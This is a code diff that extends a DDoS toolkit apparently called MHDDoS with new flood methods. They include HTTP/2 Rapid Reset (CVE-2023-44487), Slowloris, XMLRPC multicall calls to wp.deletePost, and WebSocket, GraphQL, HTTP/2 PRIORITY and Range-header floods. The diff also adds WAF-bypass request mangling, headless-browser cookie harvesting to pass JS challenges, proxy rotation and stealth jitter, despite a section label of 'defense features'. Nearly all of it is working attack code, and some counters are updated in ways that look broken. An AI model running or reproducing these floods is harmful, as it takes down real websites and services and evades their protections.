@@ -37,6 +37,8 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+from h2.connection import H2Connection
+import threading
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -124,9 +126,10 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
+        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOWLORIS", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "XMLRPC_MULTI", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
+        "WORDPRESS", "H2", "H2_RST", "COOKIE_HARVEST", "WS", "GQL", "H2_PRIORITY", "RANGE_CRASH",
     }
 
     LAYER4_AMP: Set[str] = {
@@ -213,6 +216,129 @@ search_engine_agents = [
 ]
 
 
+# ============================================================
+# SPRINT #3 — DEFENSE FEATURES
+# ============================================================
+
+# --- #18: WAF Bypass Auto-Select ---
+WAF_BYPASS_VECTORS = [
+    # (name, http_version, header_modifier_fn or None)
+    ("standard", "HTTP/1.1", None),
+    ("tab_sep", "HTTP/1.1", lambda rl: rl.replace(" ", "\t")),
+    ("double_space", "HTTP/1.1", lambda rl: rl.replace(" ", "  ")),
+    ("absolute_uri", "HTTP/1.1", lambda rl, host, path: f"{rl.split()[0]} https://{host}{path} HTTP/1.1"),
+    ("http10", "HTTP/1.0", None),
+    ("lowercase", "http/1.1", None),
+    ("null_byte", "HTTP/1.1", lambda rl, path: rl.replace(path, path[:len(path)//2] + "%00" + path[len(path)//2:])),
+    ("no_version", "", lambda rl: rl.split()[0] + " " + rl.split()[1]),
+]
+
+_waf_bypass_stats = {v[0]: {"success": 0, "fail": 0} for v in WAF_BYPASS_VECTORS}
+_waf_bypass_lock = threading.Lock()
+
+def waf_auto_select_bypass(method: str, host: str, path: str) -> str:
+    """
+    Auto-select best WAF bypass vector based on success/fail ratio.
+    Returns modified request line + stats tracked globally.
+    """
+    with _waf_bypass_lock:
+        best = max(_waf_bypass_stats.items(),
+                  key=lambda kv: kv[1]["success"] / max(kv[1]["fail"], 1))
+        vector_name = best[0]
+
+    vector = next(v for v in WAF_BYPASS_VECTORS if v[0] == vector_name)
+    rl = f"{method} {path} {vector[1]}".strip()
+    modifier = vector[2]
+    if modifier:
+        try:
+            rl = modifier(rl, host, path)
+        except TypeError:
+            rl = modifier(rl)
+    return rl + "\r\n"
+
+def waf_report_result(vector_name: str, success: bool):
+    """Report bypass result for adaptive selection."""
+    with _waf_bypass_lock:
+        if success:
+            _waf_bypass_stats[vector_name]["success"] += 1
+        else:
+            _waf_bypass_stats[vector_name]["fail"] += 1
+
+
+# --- #19: Proxy Rotation Engine ---
+class ProxyRotator:
+    """Round-robin proxy rotation with health tracking."""
+    def __init__(self, proxies):
+        self._proxies = list(proxies) if proxies else []
+        self._index = 0
+        self._lock = threading.Lock()
+        self._fails = {}
+        self._max_fails = 3
+
+    def next(self):
+        if not self._proxies:
+            return None
+        with self._lock:
+            proxy = self._proxies[self._index]
+            self._index = (self._index + 1) % len(self._proxies)
+            return proxy
+
+    def report_fail(self, proxy):
+        addr = str(proxy)
+        with self._lock:
+            self._fails[addr] = self._fails.get(addr, 0) + 1
+            if self._fails[addr] >= self._max_fails:
+                with suppress(Exception):
+                    self._proxies.remove(proxy)
+                self._fails.pop(addr, None)
+
+    def report_success(self, proxy):
+        addr = str(proxy)
+        with self._lock:
+            self._fails[addr] = 0
+
+    def __bool__(self):
+        return bool(self._proxies)
+
+    def __len__(self):
+        return len(self._proxies)
+
+
+# --- #24: Real-time Traffic Graph (ASCII) ---
+class TrafficGraph:
+    """Minimal real-time ASCII traffic graph for console."""
+    def __init__(self, max_points=30):
+        self._points = []
+        self._max_points = max_points
+        self._lock = threading.Lock()
+
+    def add(self, pps: int):
+        with self._lock:
+            self._points.append(pps)
+            if len(self._points) > self._max_points:
+                self._points.pop(0)
+
+    def render(self) -> str:
+        with self._lock:
+            if not self._points:
+                return "[no data]"
+            pts = list(self._points)
+        max_val = max(pts) or 1
+        height = 8
+        rows = []
+        for h in range(height, 0, -1):
+            threshold = max_val * h / height
+            line = ""
+            for v in pts:
+                line += "█" if v >= threshold else " "
+            rows.append(f"{int(threshold):>8} |{line}")
+        footer = f"{'':>8} +{'-' * len(pts)}"
+        return "\n".join(rows) + "\n" + footer
+
+
+_traffic_graph = TrafficGraph()
+
+
 class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
@@ -291,9 +417,10 @@ class Tools:
     def dgb_solver(url, ua, pro=None):
         s = None
         idss = None
-        with Session() as s:
-            if pro:
-                s.proxies = pro
+        s = Session()
+        if pro:
+            s.proxies = pro
+        try:
             hdrs = {
                 "User-Agent": ua,
                 "Accept": "text/html",
@@ -306,9 +433,9 @@ class Tools:
                 "TE": "trailers",
                 "DNT": "1"
             }
-            with s.get(url, headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+            ss = s.get(url, headers=hdrs)
+            for key, value in ss.cookies.items():
+                s.cookies.set_cookie(cookies.create_cookie(key, value))
             hdrs = {
                 "User-Agent": ua,
                 "Accept": "*/*",
@@ -319,11 +446,11 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
             }
-            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    if key == '__ddg2':
-                        idss = value
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+            ss = s.post("https://check.ddos-guard.net/check.js", headers=hdrs)
+            for key, value in ss.cookies.items():
+                if key == '__ddg2':
+                    idss = value
+                s.cookies.set_cookie(cookies.create_cookie(key, value))
 
             hdrs = {
                 "User-Agent": ua,
@@ -336,12 +463,12 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
             }
-            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-                return s
-
-        return False
+            ss = s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs)
+            for key, value in ss.cookies.items():
+                s.cookies.set_cookie(cookies.create_cookie(key, value))
+        except Exception:
+            pass
+        return s
 
     @staticmethod
     def safe_close(sock=None):
@@ -795,9 +922,11 @@ class HttpFlood(Thread):
                  synevent: Event = None,
                  useragents: Set[str] = None,
                  referers: Set[str] = None,
-                 proxies: Set[Proxy] = None) -> None:
+                 proxies: Set[Proxy] = None,
+                 stealth: bool = False) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
+        self._stealth = stealth
         self._thread_id = thread_id
         self._synevent = synevent
         self._rpc = rpc
@@ -814,6 +943,7 @@ class HttpFlood(Thread):
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
+            "XMLRPC_MULTI": self.XMLRPC_MULTI,
             "BOT": self.BOT,
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
@@ -823,6 +953,7 @@ class HttpFlood(Thread):
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
+            "SLOWLORIS": self.SLOWLORIS,
             "GSB": self.GSB,
             "RHEX": self.RHEX,
             "STOMP": self.STOMP,
@@ -834,6 +965,14 @@ class HttpFlood(Thread):
             "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
+            "WORDPRESS": self.WORDPRESS,
+            "H2": self.H2,
+            "H2_RST": self.H2_RST,
+            "COOKIE_HARVEST": self.COOKIE_HARVEST,
+            "WS": self.WS,
+            "GQL": self.GQL,
+            "H2_PRIORITY": self.H2_PRIORITY,
+            "RANGE_CRASH": self.RANGE_CRASH,
         }
 
         if not referers:
@@ -889,7 +1028,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+                                                      target.raw_path_qs, randchoice(['1.0', '1.1']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -914,6 +1053,8 @@ class HttpFlood(Thread):
         self.select(self._method)
         while self._synevent.is_set():
             self.SENT_FLOOD()
+            if self._stealth:
+                sleep(randint(1, 50) / 1000)  # 1-50ms jitter
 
     @property
     def SpoofIP(self) -> str:
@@ -958,12 +1099,13 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
-                                            "DYN", "SLOW", "PPS", "APACHE",
-                                            "BOT", "RHEX", "STOMP"} \
-            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
+        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "COOKIE_HARVEST", "OVH", "EVEN",
+                                            "DYN", "SLOW", "SLOWLORIS", "PPS", "APACHE",
+                                            "BOT", "RHEX", "STOMP", "WORDPRESS", "H2", "H2_RST",
+                                            "WS", "RANGE_CRASH", "H2_PRIORITY"} \
+            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS", "GQL"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
-            else "REQUESTS"
+            else "GET"
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
@@ -1055,8 +1197,17 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
-        while True:
+        """Spawn GET threads with hard cap to prevent OOM."""
+        spawned = 0
+        max_extra = 200
+        while self._synevent.is_set() and spawned < max_extra:
             Thread(target=self.GET, daemon=True).start()
+            spawned += 1
+            REQUESTS_SENT += 1
+            sleep(0.01)
+        # Continue flooding via GET in this thread
+        while self._synevent.is_set():
+            self.GET()
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
@@ -1324,14 +1475,18 @@ class HttpFlood(Thread):
             'This method requires proxies. ' \
             'Without proxies you can use github.com/codesenberg/bombardier'
 
-        while True:
-            proxy = randchoice(self._proxies)
-            if proxy.type != ProxyType.SOCKS4:
-                break
+        # Pick non-SOCKS4 proxy with fallback to avoid infinite loop
+        non_socks4 = [p for p in self._proxies if p.type != ProxyType.SOCKS4]
+        if not non_socks4:
+            logger.warning("BOMB: no non-SOCKS4 proxies found, falling back to first proxy")
+            proxy = self._proxies[0] if isinstance(self._proxies, list) else next(iter(self._proxies))
+        else:
+            proxy = randchoice(non_socks4)
 
+        bombardier = Path.home() / "go/bin/bombardier"
         res = run(
             [
-                f'{bombardier_path}',
+                str(bombardier),
                 f'--connections={self._rpc}',
                 '--http2',
                 '--method=GET',
@@ -1358,6 +1513,318 @@ class HttpFlood(Thread):
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
+        Tools.safe_close(s)
+
+    def XMLRPC_MULTI(self) -> None:
+        """XMLRPC system.multicall amplification: 1 HTTP POST = 200 XMLRPC calls."""
+        num_calls = 200
+        def _one_call(method_name):
+            return (
+                "<value><struct>"
+                f"<member><name>methodName</name><value><string>{method_name}</string></value></member>"
+                "<member><name>params</name><value><array><data>"
+                "<value><string>1</string></value>"
+                "</data></array></value></member>"
+                "</struct></value>"
+            )
+        calls = "".join(_one_call("wp.deletePost") for _ in range(num_calls))
+        body = (
+            '<?xml version="1.0" encoding="utf-8"?>'
+            '<methodCall><methodName>system.multicall</methodName>'
+            '<params><param><value><array><data>'
+            f'{calls}'
+            '</data></array></value></param></params>'
+            '</methodCall>'
+        )
+        extra = (
+            f"Content-Length: {len(body)}\r\n"
+            "X-Requested-With: XMLHttpRequest\r\n"
+            "Content-Type: text/xml; charset=utf-8\r\n\r\n"
+            f"{body}"
+        )
+        payload: bytes = self.generate_payload(extra)[:-2]
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def SLOWLORIS(self):
+        """True Slowloris: send partial header, keep alive, exhaust connection pool."""
+        s = None
+        with suppress(Exception):
+            s = self.open_connection()
+            if not s:
+                return
+            partial = str.encode(
+                f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
+                f"Host: {self._target.authority}\r\n"
+                f"User-Agent: {randchoice(self._useragents)}\r\n"
+                f"Accept-Encoding: gzip, deflate, br\r\n"
+                f"Connection: keep-alive\r\n"
+            )
+            s.send(partial)
+            REQUESTS_SENT += 1
+            BYTES_SEND += len(partial)
+            while self._synevent.is_set():
+                keep = str.encode(f"X-{randchoice(self._useragents)[:8]}: {ProxyTools.Random.rand_int(1, 99999999)}\r\n")
+                s.send(keep)
+                BYTES_SEND += len(keep)
+                sleep(ProxyTools.Random.rand_int(5, 15))
+        Tools.safe_close(s)
+
+    def WORDPRESS(self):
+        """Hit multiple WordPress endpoints per connection."""
+        endpoints = [
+            "/xmlrpc.php", "/wp-admin/admin-ajax.php", "/wp-login.php",
+            "/wp-cron.php", "/wp-json/wp/v2/posts/1", "/?rest_route=/wp/v2/users/1",
+            "/wp-comments-post.php",
+        ]
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                ep = randchoice(endpoints)
+                payload = str.encode(
+                    f"{self._req_type} {ep} HTTP/1.1\r\n"
+                    f"Host: {self._target.authority}\r\n"
+                    f"User-Agent: {randchoice(self._useragents)}\r\n"
+                    f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
+                    f"{self.SpoofIP}"
+                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    f"Accept-Encoding: gzip, deflate, br\r\n"
+                    f"Accept-Language: en-US,en;q=0.9\r\n"
+                    f"Cache-Control: max-age=0\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                )
+                Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def H2(self):
+        """HTTP/2 multiplexing flood over 1 connection."""
+        s = None
+        with suppress(Exception):
+            s = self.open_connection()
+            if not s:
+                return
+            if self._proxies or self._target.scheme != "https":
+                self.GET()
+                return
+            conn = H2Connection()
+            conn.initiate_connection()
+            s.sendall(conn.data_to_send())
+            headers = [
+                (':method', 'GET'),
+                (':authority', self._target.authority),
+                (':scheme', 'https'),
+                (':path', self._target.raw_path_qs),
+                ('user-agent', randchoice(self._useragents)),
+                ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+                ('accept-encoding', 'gzip, deflate, br'),
+                ('accept-language', 'en-US,en;q=0.5'),
+            ]
+            for i in range(self._rpc):
+                stream_id = 1 + i * 2
+                conn.send_headers(stream_id, headers)
+                s.sendall(conn.data_to_send())
+                REQUESTS_SENT += 1
+        Tools.safe_close(s)
+
+    def H2_RST(self):
+        """HTTP/2 Rapid Reset (CVE-2023-44487)."""
+        s = None
+        with suppress(Exception):
+            s = self.open_connection()
+            if not s:
+                return
+            if self._proxies or self._target.scheme != "https":
+                self.GET()
+                return
+            conn = H2Connection()
+            conn.initiate_connection()
+            s.sendall(conn.data_to_send())
+            headers = [
+                (':method', 'GET'),
+                (':authority', self._target.authority),
+                (':scheme', 'https'),
+                (':path', self._target.raw_path_qs),
+                ('user-agent', randchoice(self._useragents)),
+                ('accept', '*/*'),
+                ('accept-encoding', 'gzip, deflate, br'),
+            ]
+            for burst in range(self._rpc):
+                batch = min(100, max(10, self._rpc))
+                for i in range(batch):
+                    stream_id = (burst * batch + i) * 2 + 1
+                    conn.send_headers(stream_id, headers, end_stream=False)
+                s.sendall(conn.data_to_send())
+                for i in range(batch):
+                    stream_id = (burst * batch + i) * 2 + 1
+                    conn.reset_stream(stream_id)
+                s.sendall(conn.data_to_send())
+                REQUESTS_SENT += batch
+        Tools.safe_close(s)
+
+    _harvested_cookie = None
+    _harvest_lock = threading.Lock()
+
+    def COOKIE_HARVEST(self):
+        """Solve JS challenge via Playwright, harvest cookie, then flood."""
+        if HttpFlood._harvested_cookie is None:
+            with HttpFlood._harvest_lock:
+                if HttpFlood._harvested_cookie is None:
+                    try:
+                        from playwright.sync_api import sync_playwright
+                        with sync_playwright() as p:
+                            browser = p.chromium.launch(headless=True)
+                            page = browser.new_page()
+                            page.goto(self._target.human_repr(), timeout=30000, wait_until="networkidle")
+                            cookies = page.context.cookies()
+                            cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
+                            browser.close()
+                            HttpFlood._harvested_cookie = cookie_str or "NO_COOKIE"
+                            logger.info(f"Cookie harvested: {cookie_str[:80]}...")
+                    except Exception as e:
+                        logger.warning(f"Cookie harvest failed: {e}")
+                        HttpFlood._harvested_cookie = "NO_COOKIE"
+        cookie = HttpFlood._harvested_cookie or ""
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                payload = str.encode(
+                    f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
+                    f"Host: {self._target.authority}\r\n"
+                    f"User-Agent: {randchoice(self._useragents)}\r\n"
+                    f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
+                    f"Cookie: {cookie}\r\n"
+                    f"{self.SpoofIP}"
+                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    f"Accept-Encoding: gzip, deflate, br\r\n"
+                    f"Accept-Language: en-US,en;q=0.5\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                )
+                Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def WS(self):
+        """WebSocket Flood: upgrade to WS then spam binary frames."""
+        s = None
+        with suppress(Exception):
+            s = self.open_connection()
+            if not s:
+                return
+            key = b64encode(randbytes(16)).decode()
+            upgrade = str.encode(
+                f"GET {self._target.raw_path_qs} HTTP/1.1\r\n"
+                f"Host: {self._target.authority}\r\n"
+                f"Upgrade: websocket\r\n"
+                f"Connection: Upgrade\r\n"
+                f"Sec-WebSocket-Key: {key}\r\n"
+                f"Sec-WebSocket-Version: 13\r\n"
+                f"User-Agent: {randchoice(self._useragents)}\r\n"
+                f"\r\n"
+            )
+            s.sendall(upgrade)
+            REQUESTS_SENT += 1
+            # Wait for 101 response
+            data = b""
+            while b"\r\n\r\n" not in data:
+                chunk = s.recv(4096)
+                if not chunk:
+                    return
+                data += chunk
+            # Spam masked binary frames
+            for _ in range(self._rpc * 10):
+                mask = randbytes(4)
+                payload_len = randint(64, 65536)
+                frame = bytearray()
+                frame.append(0x82)  # FIN + BINARY opcode
+                if payload_len < 126:
+                    frame.append(0x80 | payload_len)
+                elif payload_len < 65536:
+                    frame.append(0x80 | 126)
+                    frame.extend(data_pack('>H', payload_len))
+                else:
+                    frame.append(0x80 | 127)
+                    frame.extend(data_pack('>Q', payload_len))
+                frame.extend(mask)
+                body = bytearray(randbytes(payload_len))
+                for i in range(payload_len):
+                    body[i] ^= mask[i % 4]
+                frame.extend(body)
+                s.sendall(bytes(frame))
+                REQUESTS_SENT += 1
+                BYTES_SEND += len(frame)
+        Tools.safe_close(s)
+
+    def GQL(self):
+        """GraphQL Batching: multiple queries in 1 POST body."""
+        queries = [f'q{i}:__typename' for i in range(randint(10, 50))]
+        body = '[{' + '},{'.join(f'{{"query":"{{{q}}}"}}' for q in queries) + '}]'
+        extra = (
+            f"Content-Length: {len(body)}\r\n"
+            "Content-Type: application/json\r\n"
+            "X-Requested-With: XMLHttpRequest\r\n"
+            "\r\n"
+            f"{body}"
+        )
+        payload: bytes = self.generate_payload(extra)[:-2]
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def H2_PRIORITY(self):
+        """HTTP/2 PRIORITY flood: exclusive dependency tree exhaustion."""
+        s = None
+        with suppress(Exception):
+            s = self.open_connection()
+            if not s:
+                return
+            if self._proxies or self._target.scheme != "https":
+                self.GET()
+                return
+            conn = H2Connection()
+            conn.initiate_connection()
+            s.sendall(conn.data_to_send())
+            # Open 1 stream with GET first
+            headers = [
+                (':method', 'GET'),
+                (':authority', self._target.authority),
+                (':scheme', 'https'),
+                (':path', self._target.raw_path_qs),
+                ('user-agent', randchoice(self._useragents)),
+                ('accept', '*/*'),
+            ]
+            conn.send_headers(1, headers, end_stream=True)
+            s.sendall(conn.data_to_send())
+            REQUESTS_SENT += 1
+            # Spam PRIORITY frames with exclusive flag
+            for i in range(self._rpc * 50):
+                stream_id = (i % 200) * 2 + 3  # odd stream IDs
+                parent = stream_id - 2 if stream_id > 1 else 1
+                exclusive = 1 if i % 3 == 0 else 0
+                weight = randint(0, 256)
+                conn.prioritize(stream_id, depends_on=parent,
+                               weight=weight, exclusive=bool(exclusive))
+                s.sendall(conn.data_to_send())
+                REQUESTS_SENT += 1
+        Tools.safe_close(s)
+
+    def RANGE_CRASH(self):
+        """Range Header DoS: overlapping byte ranges to crash Apache/IIS."""
+        ranges = ",".join(
+            f"{randint(0, 5000)}-{randint(1, 9999)}"
+            for _ in range(randint(200, 1000))
+        )
+        extra = f"Range: bytes={ranges}\r\nAccept-Encoding: identity\r\n"
+        payload: bytes = self.generate_payload(extra)[:-2]
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
 
@@ -1567,9 +2034,15 @@ class ToolsConsole:
     @staticmethod
     def stop():
         print('All Attacks has been Stopped !')
-        for proc in process_iter():
-            if proc.name() == "python.exe":
-                proc.kill()
+        for proc in process_iter(['name', 'cmdline']):
+            try:
+                name = (proc.info.get('name') or '').lower()
+                cmdline = proc.info.get('cmdline') or []
+                if name in ("python.exe", "python", "python3"):
+                    if any("MHDDoS" in str(arg) or "start.py" in str(arg) or "gui.py" in str(arg) for arg in cmdline):
+                        proc.kill()
+            except Exception:
+                continue
 
     @staticmethod
     def usage():
@@ -1676,6 +2149,43 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     return proxies
 
 
+# --- #26: Preset Manager ---
+class PresetManager:
+    """Save/load attack presets as JSON for quick reuse."""
+    _preset_dir: Path = __dir__ / "presets"
+
+    @classmethod
+    def _ensure_dir(cls):
+        cls._preset_dir.mkdir(parents=True, exist_ok=True)
+
+    @classmethod
+    def save(cls, name: str, **kwargs) -> str:
+        """Save a preset (method, threads, rpc, timer, etc.) to JSON."""
+        cls._ensure_dir()
+        preset_file = cls._preset_dir / f"{name}.json"
+        payload = {k: v for k, v in kwargs.items() if v is not None}
+        with open(preset_file, "w") as f:
+            from json import dump
+            dump(payload, f, indent=2)
+        return str(preset_file)
+
+    @classmethod
+    def load(cls, name: str) -> dict:
+        """Load a preset by name, returns dict or {}."""
+        preset_file = cls._preset_dir / f"{name}.json"
+        if not preset_file.exists():
+            logger.warning(f"Preset '{name}' not found.")
+            return {}
+        with open(preset_file) as f:
+            return load(f)
+
+    @classmethod
+    def list_presets(cls) -> list:
+        """List all saved preset names."""
+        cls._ensure_dir()
+        return [f.stem for f in sorted(cls._preset_dir.glob("*.json"))]
+
+
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
@@ -1756,9 +2266,22 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                # Check for --stealth or --preset flag
+                stealth = len(argv) >= 9 and argv[8].strip() == "--stealth"
+                preset_name = None
+                for a in argv[8:]:
+                    if a.startswith("--preset="):
+                        preset_name = a.split("=", 1)[1]
+                        preset = PresetManager.load(preset_name)
+                        if preset:
+                            logger.info(f"Loaded preset '{preset_name}': {preset}")
+                            threads = preset.get("threads", threads)
+                            rpc = preset.get("rpc", rpc)
+                            method = preset.get("method", method)
+                            stealth = preset.get("stealth", stealth)
                 for thread_id in range(threads):
                     HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                              uagents, referers, proxies, stealth=stealth).start()
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
@@ -1829,7 +2352,7 @@ if __name__ == '__main__':
                         protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                         
-                        if 47 < protocolid > 758:
+                        if protocolid < 47 or protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
                 for _ in range(threads):
